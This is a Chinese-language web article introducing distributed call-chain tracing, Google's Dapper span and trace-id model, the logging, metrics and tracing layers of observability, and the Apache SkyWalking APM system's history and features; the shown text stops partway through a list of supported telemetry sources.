<!DOCTYPE html>
<html class="no-js" lang="en">
<head>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<meta http-equiv="X-UA-Compatible" content="IE=edge">
	<title>APM SkyWalking及服务可观察性 - 编程小白</title>
	<script>(function(d,e){d[e]=d[e].replace("no-js","js");})(document.documentElement,"className");</script>
	<meta name="description" content="">
	<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
	<link rel="dns-prefetch" href="//fonts.googleapis.com">
	<link rel="dns-prefetch" href="//fonts.gstatic.com">
	<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:400,400i,700">

	<link rel="stylesheet" href="/css/style.css">
	

	<link rel="shortcut icon" href="/favicon.ico">
		
</head>
<body class="body">
	<div class="container container--outer">
		<header class="header">
	<div class="container header__container">
		
	<div class="logo">
		<a class="logo__link" href="/" title="编程小白" rel="home">
			<div class="logo__item logo__text">
					<div class="logo__title">编程小白</div>
					
				</div>
		</a>
	</div>
		<div class="divider"></div>
	</div>
</header>
		<div class="wrapper flex">
			<div class="primary">
			
<main class="main" role="main">
	<article class="post">
		<header class="post__header">
			<h1 class="post__title">APM SkyWalking及服务可观察性</h1>
			
		</header>
		<div class="content post__content clearfix">
			


                <div id="content_views" class="htmledit_views">
                    <p style="margin-left:.0001pt;text-align:center"><strong>APM SkyWalking及服务可观察性</strong></p> 
<table border="1" cellspacing="0" style="width:568px"><tbody>
<tr>
<td rowspan="4" style="border-color:#000000;vertical-align:top;width:106.1pt"> <p style="margin-left:.0001pt;text-align:justify">文件状态：</p> <p style="margin-left:.0001pt;text-align:justify">[ ] 草稿</p> <p style="margin-left:.0001pt;text-align:justify">[√] 正在修改</p> </td>
<td style="background-color:#d9d9d9;border-color:#000000;width:70.85pt"> <p style="margin-left:.0001pt;text-align:justify"><span style="color:#000000">当前版本</span></p> </td>
<td style="border-color:#000000;vertical-align:top;width:249.15pt"> <p style="margin-left:.0001pt;text-align:justify">1.0</p> </td>
</tr>
<tr>
<td style="background-color:#d9d9d9;width:70.85pt"> <p style="margin-left:.0001pt;text-align:justify"><span style="color:#000000">历史修订版本</span></p> </td>
<td style="vertical-align:top;width:249.15pt"> <p style="margin-left:.0001pt;text-align:justify">1.0;</p> </td>
</tr>
<tr>
<td style="background-color:#d9d9d9;width:70.85pt"> <p style="margin-left:.0001pt;text-align:justify"><span style="color:#000000">作    者</span></p> </td>
<td style="vertical-align:top;width:249.15pt"> <p style="margin-left:.0001pt;text-align:justify">杜有龙</p> </td>
</tr>
<tr>
<td style="background-color:#d9d9d9;width:70.85pt"> <p style="margin-left:.0001pt;text-align:justify"><span style="color:#000000">完成日期</span></p> </td>
<td style="vertical-align:top;width:249.15pt"> <p style="margin-left:.0001pt;text-align:justify">2021-09-01</p> </td>
</tr>
</tbody></table>
<p style="margin-left:.0001pt;text-align:center"><img alt="" height="191" src="https://images2.imgbox.com/3c/bb/tUdHzM7j_o.png" width="554"></p> 
<p></p> 
<p style="margin-left:.0001pt;text-align:justify"></p> 
<h1 style="margin-left:0cm"><span style="background-color:#ffffff"><span style="color:#00b0f0">一、分布式调用链路</span></span></h1> 
<p style="margin-left:.0001pt;text-align:justify"><img alt="" height="403" src="https://images2.imgbox.com/8f/10/iHQdV1tQ_o.png" width="515"></p> 
<p></p> 
<h2 style="margin-left:0;text-align:justify">
<span style="background-color:#ffffff"><span style="color:#00b0f0">1</span></span><span style="background-color:#ffffff"><span style="color:#00b0f0">、分布式调用链路简图</span></span>
</h2> 
<p style="margin-left:.0001pt;text-align:justify"><span style="background-color:#ffffff"><span style="color:#4f4f4f">在分布式架构系统中，几乎每一个前端请求都会形成一个复杂的分布式服务调用链路。一个浏览器请求完整的调用链可能如下图所示。</span></span></p> 
<p style="margin-left:.0001pt;text-align:justify"><img alt="" height="391" src="https://images2.imgbox.com/03/c9/wJsqMmkm_o.png" width="521"></p> 
<p></p> 
<h2 style="margin-left:0;text-align:justify">
<span style="background-color:#ffffff"><span style="color:#00b0f0">2</span></span><span style="background-color:#ffffff"><span style="color:#00b0f0">、分布式调用链路特点</span></span>
</h2> 
<ol>
<li style="text-align:left"><span style="background-color:#f8f8f8"><span style="color:#666666">多进程：分布式架构</span></span></li>
<li style="text-align:left"><span style="background-color:#f8f8f8"><span style="color:#666666">多团队：不同的团队开发</span></span></li>
<li style="text-align:left"><span style="background-color:#f8f8f8"><span style="color:#666666">多语言：不同的编程语言实现</span></span></li>
<li style="text-align:left"><span style="background-color:#f8f8f8"><span style="color:#666666">一对多服务：一次请求需要涉及到多个子系统</span></span></li>
<li style="text-align:left"><span style="background-color:#f8f8f8"><span style="color:#666666">多机房：不同的系统部署在不同的机房</span></span></li>
<li style="text-align:left"><span style="background-color:#f8f8f8"><span style="color:#666666">多数据中心：不同的系统向不同的数据中心获取数据</span></span></li>
</ol>
<p style="margin-left:.0001pt;text-align:justify"></p> 
<h2 style="margin-left:0;text-align:justify">
<span style="background-color:#ffffff"><span style="color:#00b0f0">3</span></span><span style="background-color:#ffffff"><span style="color:#00b0f0">、调用链路会带来什么问题</span></span>
</h2> 
<p style="margin-left:.0001pt;text-align:center"><strong><span style="background-color:#ffffff"><span style="color:#ffc000">常见的问题简图</span></span></strong></p> 
<p style="margin-left:.0001pt;text-align:justify"><img alt="" height="305" src="https://images2.imgbox.com/3a/e3/MFyKII9B_o.png" width="386"></p> 
<p></p> 
<p style="margin-left:.0001pt;text-align:center"><strong><span style="background-color:#ffffff"><span style="color:#ffc000">遇到上述问题，我们会产生诸多疑问</span></span></strong></p> 
<ol>
<li style="text-align:left"><span style="background-color:#f8f8f8"><span style="color:#666666">如何快速发现问题？</span></span></li>
<li style="text-align:left"><span style="background-color:#f8f8f8"><span style="color:#666666">如何找到问题？</span></span></li>
<li style="text-align:left"><span style="background-color:#f8f8f8"><span style="color:#666666">如何判断故障影响范围？</span></span></li>
<li style="text-align:left"><span style="background-color:#f8f8f8"><span style="color:#666666">如何梳理服务依赖以及依赖的合理性？</span></span></li>
<li style="text-align:left"><span style="background-color:#f8f8f8"><span style="color:#666666">如何分析链路性能问题？</span></span></li>
</ol>
<p style="margin-left:.0001pt;text-align:justify"><span style="background-color:#ffffff"><span style="color:#4f4f4f">（用户对搜索的耗时是很敏感的，而任何一个子系统的低效都会导致最终的搜索耗时。）</span></span></p> 
<p style="margin-left:.0001pt;text-align:justify"></p> 
<p style="margin-left:.0001pt;text-align:justify"><strong><span style="background-color:#ffffff"><span style="color:#ffc000">想要解决分布式系统面临的上述一些列问题，并且理解分布式系统的行为。</span></span></strong></p> 
<p style="margin-left:.0001pt;text-align:justify"><strong><span style="background-color:#ffffff"><span style="color:#ffc000">就需要监控那些横跨了不同的应用、不同的服务器之间的关联动作。</span></span></strong></p> 
<p style="margin-left:.0001pt;text-align:justify"><strong><span style="background-color:#ffffff"><span style="color:#ffc000">帮助我们进行系统的持续监控，以便发生问题时，能够快速定位问题所在。</span></span></strong></p> 
<h2 style="margin-left:0;text-align:justify">
<span style="background-color:#ffffff"><span style="color:#00b0f0">4</span></span><span style="background-color:#ffffff"><span style="color:#00b0f0">、调用链路监控理论（Dapper）</span></span>
</h2> 
<p style="margin-left:.0001pt;text-align:justify">       <strong><span style="background-color:#ffffff"><span style="color:#ffc000">Dapper</span></span></strong><strong><span style="background-color:#ffffff"><span style="color:#ffc000">，是最早关于调用链路监控的理论。</span></span></strong></p> 
<p style="margin-left:.0001pt;text-align:justify"><span style="background-color:#ffffff"><span style="color:#4f4f4f">2010</span></span><span style="background-color:#ffffff"><span style="color:#4f4f4f">年Google公开的论文提到了 </span></span><a href="https://link.juejin.im?target=http%3A%2F%2Fbigbully.github.io%2FDapper-translation" title="Dapper">Dapper</a><span style="background-color:#ffffff"><span style="color:#4f4f4f">，a Large-Scale Distributed Systems Tracing Infrastructure（大规模分布式系统跟踪基础设施） 。</span></span></p> 
<p style="margin-left:.0001pt;text-align:justify"><strong><span style="background-color:#ffffff"><span style="color:#ffc000">该论文可以归类为三个核心。</span></span></strong></p> 
<h3 style="margin-left:0;text-align:justify">
<span style="background-color:#ffffff"><span style="color:#00b0f0">4.1</span></span><span style="background-color:#ffffff"><span style="color:#00b0f0">、请求调用的关注点</span></span>
</h3> 
<p style="margin-left:.0001pt;text-align:justify"><span style="background-color:#ffffff"><span style="color:#4f4f4f">关注在请求处理期间各个调用的各项性能指标。</span></span></p> 
<ol>
<li style="text-align:left"><span style="background-color:#f8f8f8"><strong><span style="color:#666666">吞吐量</span></strong><span style="color:#666666">：组件、平台、物理设备的实时吞吐量。</span></span></li>
<li style="text-align:left"><span style="background-color:#f8f8f8"><strong><span style="color:#666666">响应时间</span></strong><span style="color:#666666">：包括整体调用的响应时间和各个服务的响应时间。</span></span></li>
<li style="text-align:left"><span style="background-color:#f8f8f8"><strong><span style="color:#666666">错误记录</span></strong><span style="color:#666666">：根据服务响应错误信息统计单位时间异常次数。</span></span></li>
</ol>
<h3 style="margin-left:0;text-align:justify">
<span style="background-color:#ffffff"><span style="color:#00b0f0">4.2</span></span><span style="background-color:#ffffff"><span style="color:#00b0f0">、调用链路监控的目的</span></span>
</h3> 
<table border="1" cellspacing="0" style="margin-left:21.05pt"><tbody><tr><td style="border-color:#000000;vertical-align:top;width:13cm"> <p style="margin-left:.0001pt;text-align:justify"><span style="background-color:#ffffff"><span style="color:#7b7b7b">全链路监控从整体维度到局部维度展示各项指标，将跨应用的所有调用链性能信息集中展现，可方便度量整体和局部性能，并且方便找到故障产生的源头，生产上可极大缩短故障排除时间。</span></span></p> </td></tr></tbody></table>
<p style="margin-left:.0001pt;text-align:justify"></p> 
<p style="margin-left:.0001pt;text-align:justify"><strong><span style="background-color:#ffffff"><span style="color:#ffc000">在全链路监控工具中，能够带给我们什么?</span></span></strong></p> 
<ol>
<li style="text-align:left"><span style="background-color:#f8f8f8"><strong><span style="color:#666666">故障定位：</span></strong><span style="color:#666666">可以通过调用链结合业务日志快速定位错误信息</span></span></li>
<li style="text-align:left"><span style="background-color:#f8f8f8"><strong><span style="color:#666666">部署分析：</span></strong><span style="color:#666666">准确掌握生产一线应用部署情况</span></span></li>
<li style="text-align:left"><span style="background-color:#f8f8f8"><strong><span style="color:#666666">性能问题定位：</span></strong><span style="color:#666666">找到影响性能的位置，可以做以下三方面的优化</span></span></li>
</ol>
<ul>
<li style="text-align:left"><span style="background-color:#f8f8f8"><strong><span style="color:#666666">依赖优化：</span></strong><span style="color:#666666">梳理各个调用环节的可用性，查找服务依赖关系，进行优化</span></span></li>
<li style="text-align:left"><span style="background-color:#f8f8f8"><strong><span style="color:#666666">链路优化：</span></strong><span style="color:#666666">可以得到用户的行为路径，对不合理的链路进行优化调整</span></span></li>
<li style="text-align:left"><span style="background-color:#f8f8f8"><strong><span style="color:#666666">关键点优化：</span></strong><span style="color:#666666">从调用链全流程性能角度，识别关键调用链，并进行优化</span></span></li>
</ul>
<p style="margin-left:.0001pt;text-align:justify"></p> 
<h3 style="margin-left:0;text-align:justify">
<span style="background-color:#ffffff"><span style="color:#00b0f0">4.3</span></span><span style="background-color:#ffffff"><span style="color:#00b0f0">、调用链路实现方式：跟踪树与span</span></span>
</h3> 
<p style="margin-left:.0001pt;text-align:center"><strong><span style="background-color:#ffffff"><span style="color:#ffc000">Dapper</span></span></strong><strong><span style="background-color:#ffffff"><span style="color:#ffc000">技术实现核心思想。</span></span></strong></p> 
<p style="margin-left:.0001pt;text-align:justify"><span style="background-color:#ffffff"><span style="color:#4f4f4f">Dapper</span></span><span style="background-color:#ffffff"><span style="color:#4f4f4f">的核心实现方法是在分布式请求的上下文中加入</span></span><span style="background-color:#ffffff"><span style="color:#ff0000">span id</span></span><span style="background-color:#ffffff"><span style="color:#4f4f4f">以及 </span></span><span style="background-color:#ffffff"><span style="color:#ff0000">parent id</span></span><span style="background-color:#ffffff"><span style="color:#4f4f4f">，用于记录请求的上下级关系，这个关系用</span></span><span style="background-color:#ffffff"><span style="color:#ff0000">树</span></span><span style="background-color:#ffffff"><span style="color:#4f4f4f">形结构来表示。</span></span></p> 
<p style="margin-left:.0001pt;text-align:justify"><span style="background-color:#ffffff"><span style="color:#4f4f4f">一次特定跟踪会产生一个</span></span><span style="background-color:#ffffff"><span style="color:#ff0000">trace id</span></span><span style="background-color:#ffffff"><span style="color:#767171">。</span></span><span style="background-color:#ffffff"><span style="color:#4f4f4f">一次特定跟踪的所有相关 span 会共享同一个通用的trace id 。</span></span></p> 
<p style="margin-left:.0001pt;text-align:justify"><img alt="" height="440" src="https://images2.imgbox.com/60/82/T2x1oBmv_o.png" width="554"></p> 
<p></p> 
<p style="margin-left:.0001pt;text-align:center"><span style="background-color:#ffffff"><span style="color:#4f4f4f">（分布式追踪示意图）</span></span></p> 
<p style="margin-left:.0001pt;text-align:justify">      </p> 
<table border="1" cellspacing="0"><tbody><tr><td style="border-color:#000000;vertical-align:top;width:414.8pt"> <p style="margin-left:.0001pt;text-align:justify"><span style="background-color:#ffffff"><span style="color:#767171">在 Dapper 跟踪树中，树节点是基本单元，我们称之为 span。节点之间的连线表示 span 与其父span 之间的关系。虽然节点在整个跟踪树中的位置是独立的，但 span 也是一个简单的时间戳日志，其中编码了这个 span 的开始时间、结束时间、RPC 时间数据、以及0或多个应用程序相关的标注。</span></span></p> <p style="margin-left:.0001pt;text-align:justify"><span style="background-color:#ffffff"><span style="color:#767171">Dapper </span></span><span style="background-color:#ffffff"><span style="color:#767171">为每个 span 记录了一个可读的span name、span id和 parent id，这样就能重建出一次分布式跟踪过程中不同 span 之间的关系。没有parent id 的 span被称为 根span。一次特定跟踪的所有相关 span 会共享同一个通用的</span></span><span style="background-color:#ffffff"><span style="color:#808080">trace id </span></span><span style="background-color:#ffffff"><span style="color:#767171">（trace id在图中没有绘出）。所有这些 ID 可能是唯一的 64 位整数。在一个典型的 Dapper 跟踪中，我们希望每个 RPC 对应一个 span，每一个组件层对应跟踪树上的一个层级</span></span><span style="background-color:#ffffff"><span style="color:#767171">。</span></span></p> </td></tr></tbody></table>
<p style="margin-left:.0001pt;text-align:justify"></p> 
<h1 style="margin-left:0cm"><span style="background-color:#ffffff"><span style="color:#00b0f0">二、SkyWalking</span></span></h1> 
<p style="margin-left:.0001pt;text-align:justify"><img alt="" height="496" src="https://images2.imgbox.com/d7/8b/66XJM60M_o.png" width="522"></p> 
<p></p> 
<h2 style="margin-left:0;text-align:justify">
<span style="background-color:#ffffff"><span style="color:#00b0f0">1</span></span><span style="background-color:#ffffff"><span style="color:#00b0f0">、服务可观察性</span></span>
</h2> 
<h3 style="margin-left:0;text-align:justify">
<span style="color:#00b0f0">1.1</span><span style="color:#00b0f0">、什么是服务可观察，为什么要做到可观察</span>
</h3> 
<p style="margin-left:.0001pt;text-align:center"><strong><span style="background-color:#ffffff"><span style="color:#ffc000">服务对运维和开发者是透明的，</span></span></strong></p> 
<p style="margin-left:.0001pt;text-align:center"><strong><span style="background-color:#ffffff"><span style="color:#ffc000">在发生问题之前或者发生问题时，</span></span></strong></p> 
<p style="margin-left:.0001pt;text-align:center"><strong><span style="background-color:#ffffff"><span style="color:#ffc000">我们是可以观察到服务的运行状况。</span></span></strong></p> 
<table border="1" cellspacing="0"><tbody><tr><td style="border-color:#000000;vertical-align:top;width:414.8pt"> <p style="margin-left:.0001pt;text-align:justify"><span style="background-color:#ffffff"><span style="color:#767171">随着容器化编排、私有云等各项技术的持续进化，为分布式服务化提供了技术层面的支持。随着微服务架构的持续演进，应用和服务数量不断增加，调用关系越来越复杂。无法通过一张静态的架构图来描述微服务架构下的系统部署情况。所以，从开发和运维的角度来看，需要对资源保持可观察性(Observability)。</span></span></p> <p style="margin-left:.0001pt;text-align:justify"><span style="background-color:#ffffff"><span style="color:#767171">可观察性要求提供穿越微服务边界的能力，并对应用数据或平台数据进行观测及分析，然后通过高度可视化系统，直观地将系统当前的状态展现出来。</span></span></p> </td></tr></tbody></table>
<p style="margin-left:.0001pt;text-align:justify"></p> 
<h3 style="margin-left:0;text-align:justify">
<span style="color:#00b0f0">1.2</span><span style="color:#00b0f0">、可观察层次划分</span>
</h3> 
<p style="margin-left:.0001pt;text-align:center"><strong><span style="background-color:#ffffff"><span style="color:#ffc000">从“可观察”的对象的角度，可以将其归纳为三个层次。</span></span></strong></p> 
<p style="margin-left:.0001pt;text-align:justify"></p> 
<ul><li style="text-align:justify"><strong><span style="background-color:#ffffff"><span style="color:#4f4f4f">基础设施层</span></span></strong></li></ul>
<p style="margin-left:.0001pt;text-align:justify"><span style="background-color:#ffffff"><span style="color:#4f4f4f">对</span></span><span style="background-color:#ffffff"><span style="color:#ff0000">主机、操作系统</span></span><span style="background-color:#ffffff"><span style="color:#4f4f4f">进行的</span></span><span style="background-color:#ffffff"><span style="color:#ff0000">指标</span></span><span style="background-color:#ffffff"><span style="color:#4f4f4f">监控。</span></span></p> 
<p style="margin-left:.0001pt;text-align:justify"><span style="background-color:#ffffff"><span style="color:#4f4f4f">基础设施层的监控和系统健康度观察大多由</span></span><span style="background-color:#ffffff"><span style="color:#ff0000">平台提供商</span></span><span style="background-color:#ffffff"><span style="color:#4f4f4f">直接负责。</span></span></p> 
<ul><li style="text-align:justify"><strong><span style="background-color:#ffffff"><span style="color:#4f4f4f">工具层</span></span></strong></li></ul>
<p style="margin-left:.0001pt;text-align:justify"><span style="background-color:#ffffff"><span style="color:#4f4f4f">编排工具的可观察性是微服务体系中的重要一环，随着容器化的不断推进，对</span></span><span style="background-color:#ffffff"><span style="color:#ff0000">Kubernetes</span></span><span style="background-color:#ffffff"><span style="color:#4f4f4f">和Mesos等容器编排</span></span><span style="background-color:#ffffff"><span style="color:#ff0000">生态工具</span></span><span style="background-color:#ffffff"><span style="color:#4f4f4f">的监控也越来越多样化。另外，由于</span></span><span style="background-color:#ffffff"><span style="color:#ff0000">DevOps</span></span><span style="background-color:#ffffff"><span style="color:#4f4f4f">体系的发展，相关工具链(如Git、SVN、CVCD等)的可观察性也成为当今的关注焦点。</span></span></p> 
<p style="margin-left:.0001pt;text-align:justify"><span style="background-color:#ffffff"><span style="color:#4f4f4f">工具层的解决方基本是由其核心产品以及</span></span><span style="background-color:#ffffff"><span style="color:#ff0000">周边生态提供</span></span><span style="background-color:#ffffff"><span style="color:#4f4f4f">的。</span></span></p> 
<ul><li style="text-align:justify"><strong><span style="background-color:#ffffff"><span style="color:#4f4f4f">应用环境层</span></span></strong></li></ul>
<p style="margin-left:.0001pt;text-align:justify"><span style="background-color:#ffffff"><span style="color:#4f4f4f">应用环境层的可观察性是指对</span></span><span style="background-color:#ffffff"><span style="color:#ff0000">应用自身</span></span><span style="background-color:#ffffff"><span style="color:#4f4f4f">、应用的</span></span><span style="background-color:#ffffff"><span style="color:#ff0000">服务器</span></span><span style="background-color:#ffffff"><span style="color:#4f4f4f">、</span></span><span style="background-color:#ffffff"><span style="color:#ff0000">数据库</span></span><span style="background-color:#ffffff"><span style="color:#4f4f4f">、</span></span><span style="background-color:#ffffff"><span style="color:#ff0000">消息队列</span></span><span style="background-color:#ffffff"><span style="color:#4f4f4f">、</span></span><span style="background-color:#ffffff"><span style="color:#ff0000">缓存</span></span><span style="background-color:#ffffff"><span style="color:#4f4f4f">等中间件组件进行观察。</span></span></p> 
<h3 style="margin-left:0;text-align:justify">
<span style="color:#00b0f0">1.3</span><span style="color:#00b0f0">、应用环境层的多维度观察</span>
</h3> 
<p style="margin-left:.0001pt;text-align:center"><strong><span style="background-color:#ffffff"><span style="color:#ffc000">应用环境层，可观察三个核心概念分别为日志（Logging）、指标（Metrics）、追踪（Tracing）。</span></span></strong></p> 
<ul><li style="text-align:justify">
<strong><span style="background-color:#ffffff"><span style="color:#4f4f4f">日志</span></span></strong><span style="background-color:#ffffff"><span style="color:#4f4f4f">（Logging）</span></span>
</li></ul>
<p style="margin-left:.0001pt;text-align:justify"><span style="background-color:#ffffff"><span style="color:#4f4f4f">描述的是一些不连续的</span></span><strong><span style="background-color:#ffffff"><span style="color:#ffc000">（特性）</span></span></strong><span style="background-color:#ffffff"><span style="color:#ff0000">离散事件</span></span><span style="background-color:#ffffff"><span style="color:#4f4f4f">。例如，有些业务系统采用</span></span><span style="background-color:#ffffff"><span style="color:#ff0000">ELK</span></span><span style="background-color:#ffffff"><span style="color:#4f4f4f">(Elasticsearch+Logstash+ Kinaba)</span></span><span style="background-color:#ffffff"><span style="color:#4f4f4f">或类似技术栈的日志收集系统，它们是分布式监控系统的早期形态，借鉴了传统应用解决问题的方式，是最容易理解的解决方案。</span></span></p> 
<p style="margin-left:.0001pt;text-align:justify"><span style="background-color:#ffffff"><span style="color:#4f4f4f">商业化的日志系统</span></span><span style="background-color:#ffffff"><span style="color:#ff0000">Splunk</span></span><span style="background-color:#ffffff"><span style="color:#4f4f4f">。</span></span></p> 
<p style="margin-left:.0001pt;text-align:justify"></p> 
<ul><li style="text-align:justify">
<strong><span style="background-color:#ffffff"><span style="color:#4f4f4f">指标</span></span></strong><span style="background-color:#ffffff"><span style="color:#4f4f4f">（Metrics）</span></span>
</li></ul>
<p style="margin-left:.0001pt;text-align:justify"><span style="background-color:#ffffff"><span style="color:#4f4f4f">可累加的，它具有</span></span><strong><span style="background-color:#ffffff"><span style="color:#ffc000">（特性）</span></span></strong><span style="background-color:#ffffff"><span style="color:#ff0000">原子性</span></span><span style="background-color:#ffffff"><span style="color:#4f4f4f">。每个指标都是一个逻辑计量单元，体现了一段时间之内相关指标的状态。</span></span></p> 
<p style="margin-left:.0001pt;text-align:justify"><span style="background-color:#ffffff"><span style="color:#4f4f4f">例如，每分钟请求的次数、内存的使用情况可以定义为一个曲线图。</span></span></p> 
<p style="margin-left:.0001pt;text-align:justify"><span style="background-color:#ffffff"><span style="color:#4f4f4f">CNCF</span></span><span style="background-color:#ffffff"><span style="color:#4f4f4f">生态中的 </span></span><span style="background-color:#ffffff"><span style="color:#ff0000">Prometheus</span></span><span style="background-color:#ffffff"><span style="color:#4f4f4f">监控系统正是基于指标的典型系统，它通过定义和收集不同的指标数据，以及提供基于时间维度的查询能力，为分布式服务指标提供基础数据保障。</span></span></p> 
<p style="margin-left:.0001pt;text-align:justify"></p> 
<ul><li style="text-align:justify">
<strong><span style="background-color:#ffffff"><span style="color:#4f4f4f">追踪</span></span></strong><span style="background-color:#ffffff"><span style="color:#4f4f4f">（Tracing）</span></span>
</li></ul>
<p style="margin-left:.0001pt;text-align:justify"><span style="background-color:#ffffff"><span style="color:#4f4f4f">在监控领域通常被称为</span></span><span style="background-color:#ffffff"><span style="color:#ff0000">分布式追踪</span></span><span style="background-color:#ffffff"><span style="color:#4f4f4f">，是指在单次请求范围内处理信息。任何的数据和元数据信息都被绑定到了系统中的单个事务上。追踪能力是近几年技术人员最为关注的需求，由Twitter开源的</span></span><span style="background-color:#ffffff"><span style="color:#ff0000">ZipKin</span></span><span style="background-color:#ffffff"><span style="color:#4f4f4f">是目前运用最为广泛的分布式追踪系统。</span></span></p> 
<p style="text-align:center"><img alt="" height="211" src="https://images2.imgbox.com/86/13/eJgo13Sr_o.png" width="277"></p> 
<p></p> 
<p style="margin-left:.0001pt;text-align:justify"><strong><span style="background-color:#ffffff"><span style="color:#ffc000">观察韦恩图，可以发现上面介绍的三个概念并</span></span></strong><strong><span style="background-color:#ffffff"><span style="color:#ff0000">不是相互独立的</span></span></strong><strong><span style="background-color:#ffffff"><span style="color:#ffc000">，往往会有一定的</span></span></strong><strong><span style="background-color:#ffffff"><span style="color:#ff0000">重叠</span></span></strong><strong><span style="background-color:#ffffff"><span style="color:#ffc000">。比如skywalking可以进行日志采集。</span></span></strong></p> 
<p style="margin-left:.0001pt;text-align:justify"><strong><span style="background-color:#ffffff"><span style="color:#ffc000">复杂和完善的监控系统一般是跨越多个维度的。</span></span></strong></p> 
<p style="margin-left:.0001pt;text-align:justify"><span style="background-color:#ffffff"><span style="color:#4f4f4f">充分理解这三个概念，能够更好的定位目前市场上各种开源和商业监控工具或系统，理解它们的核心优势。</span></span></p> 
<h2 style="margin-left:0;text-align:justify">
<span style="background-color:#ffffff"><span style="color:#00b0f0">2</span></span><span style="background-color:#ffffff"><span style="color:#00b0f0">、SkyWalking介绍</span></span>
</h2> 
<p style="margin-left:.0001pt;text-align:justify"><span style="background-color:#ffffff"><span style="color:#4f4f4f">SkyWalking</span></span><span style="background-color:#ffffff"><span style="color:#4f4f4f">由中国人吴晟于2015年创建，早期是一个单纯的分布式追踪系统。目前已发展为一个全功能、多语言、支持多种应用场景的APM系统。</span></span></p> 
<p style="margin-left:.0001pt;text-align:justify"><span style="background-color:#ffffff"><span style="color:#4f4f4f">2017</span></span><span style="background-color:#ffffff"><span style="color:#4f4f4f">年12月8日，Apache软件基金会孵化器项目管理委员会 ASF IPMC宣布“SkyWalking全票通过，进入Apache孵化器”。</span></span></p> 
<p style="margin-left:.0001pt;text-align:justify"><span style="color:#4f4f4f">Skywalking</span><span style="color:#4f4f4f">的定位是apm，不仅提供了自动分布式追踪，还可以通过手动埋探针的方式去处理我们的一些特殊需求。同时它还支持了很多中间件和jvm监控，这是目前一些分布式追踪技术未能解决的问题。</span></p> 
<p style="margin-left:.0001pt;text-align:justify"><span style="color:#4f4f4f">比如zipkin技术，不能解决kafka等一些中间件和jvm的监控功能，也不支持自定义去追踪自己想要了解的链路信息。</span></p> 
<p style="margin-left:.0001pt;text-align:justify"><span style="color:#4f4f4f">在这些方面skywalking做的比较好，通过探针的方式来进行监控做到代码0侵入性，而性能开销极小。</span></p> 
<p style="margin-left:.0001pt;text-align:justify"></p> 
<h3 style="margin-left:0;text-align:justify">
<span style="background-color:#ffffff"><span style="color:#00b0f0">2.1</span></span><span style="background-color:#ffffff"><span style="color:#00b0f0">、Apache官网解释</span></span>
</h3> 
<p style="margin-left:.0001pt;text-align:justify"><strong><span style="background-color:#ffffff"><span style="color:#24292e">SkyWalking</span></span></strong><span style="background-color:#ffffff"><span style="color:#24292e">: <strong>a</strong></span></span><strong><span style="background-color:#ffffff"><span style="color:#4f4f4f">n APM(application performance monitor) system</span></span></strong><span style="background-color:#ffffff"><span style="color:#4f4f4f">, especially designed for microservices<strong>, </strong>cloud native and container-based (Docker, Kubernetes, Mesos) architectures.</span></span></p> 
<p style="margin-left:.0001pt;text-align:justify"><span style="background-color:#ffffff"><span style="color:#4f4f4f">一种APM（应用程序性能监视器）系统，专为微服务，云原生和基于容器（Docker，Kubernetes，Mesos）架构而设计。</span></span></p> 
<p style="margin-left:.0001pt;text-align:justify"></p> 
<table border="1" cellspacing="0"><tbody><tr><td style="border-color:#000000;vertical-align:top;width:414.8pt"> <p style="margin-left:.0001pt;text-align:justify"><span style="background-color:#ffffff"><span style="color:#767171">什么是APM？</span></span></p> <p style="margin-left:.0001pt;text-align:justify"><span style="background-color:#ffffff"><span style="color:#767171">在分布式系统中， 我们就需要一些可以帮助理解系统行为、用于分析性能问题的工具，以便发生故障的时候，能够快速定位和解决问题，这就是所谓的APM（application performance monitor） 。</span></span></p> </td></tr></tbody></table>
<p style="margin-left:.0001pt;text-align:justify"><img alt="" height="340" src="https://images2.imgbox.com/2a/59/VWl6SOyd_o.png" width="554"></p> 
<p></p> 
<p style="margin-left:.0001pt;text-align:justify"></p> 
<p style="margin-left:.0001pt;text-align:justify"></p> 
<h3 style="margin-left:0;text-align:justify">
<span style="background-color:#ffffff"><span style="color:#00b0f0">2.2</span></span><span style="background-color:#ffffff"><span style="color:#00b0f0">、Skywalking主要特性</span></span>
</h3> 
<p style="margin-left:.0001pt;text-align:left"><span style="background-color:#ffffff"><strong><span style="color:#24292e">The core features are following.</span></strong></span></p> 
<ol>
<li style="text-align:justify"><span style="background-color:#ffffff"><span style="color:#4f4f4f">Distributed tracing </span></span></li>
<li style="text-align:justify"><span style="background-color:#ffffff"><span style="color:#4f4f4f">Service, service instance, endpoint metrics analysis</span></span></li>
<li style="text-align:justify"><span style="background-color:#ffffff"><span style="color:#4f4f4f">Root cause analysis. Code on the runtime analysis</span></span></li>
<li style="text-align:justify"><span style="background-color:#ffffff"><span style="color:#4f4f4f">Service topology map analysis</span></span></li>
<li style="text-align:justify"><span style="background-color:#ffffff"><span style="color:#4f4f4f">Service, service instance and endpoint dependency analysis</span></span></li>
<li style="text-align:justify"><span style="background-color:#ffffff"><span style="color:#4f4f4f">Slow services and endpoints detected</span></span></li>
<li style="text-align:justify"><span style="background-color:#ffffff"><span style="color:#4f4f4f">Database metrics monitoring</span></span></li>
<li style="text-align:justify"><span style="background-color:#ffffff"><span style="color:#4f4f4f">Alarm</span></span></li>
<li style="text-align:justify"><span style="background-color:#ffffff"><span style="color:#4f4f4f">Browser performance monitoring</span></span></li>
<li style="text-align:justify">
<span style="background-color:#ffffff"><span style="color:#4f4f4f">Infrastructure</span></span><span style="background-color:#ffffff"><span style="color:#4f4f4f">(VM, network, disk etc.) monitoring</span></span>
</li>
<li style="text-align:justify"><span style="background-color:#ffffff"><span style="color:#4f4f4f">Metrics, traces, and logs</span></span></li>
</ol>
<h3 style="margin-left:0;text-align:justify">
<span style="background-color:#ffffff"><span style="color:#00b0f0">2.3</span></span><span style="background-color:#ffffff"><span style="color:#00b0f0">、Skywalking对遥测数据来源支持</span></span>
</h3> 
<p style="margin-left:.0001pt;text-align:justify"></p> 
<p style="margin-left:.0001pt;text-align:left"><span style="background-color:#ffffff"><span style="color:#24292e">SkyWalking supports to collect telemetry (metrics, traces, and logs) data from multiple sources and multiple formats, including</span></span></p> 
<ol>
<li style="text-align:left"><span style="background-color:#ffffff"><span style="color:#24292e">J</span><span style="background-color:#ffffff"><span style="color:#4f4f4f">ava, .NET Core, NodeJS, PHP, and Python auto agents.</span></span></span></li>
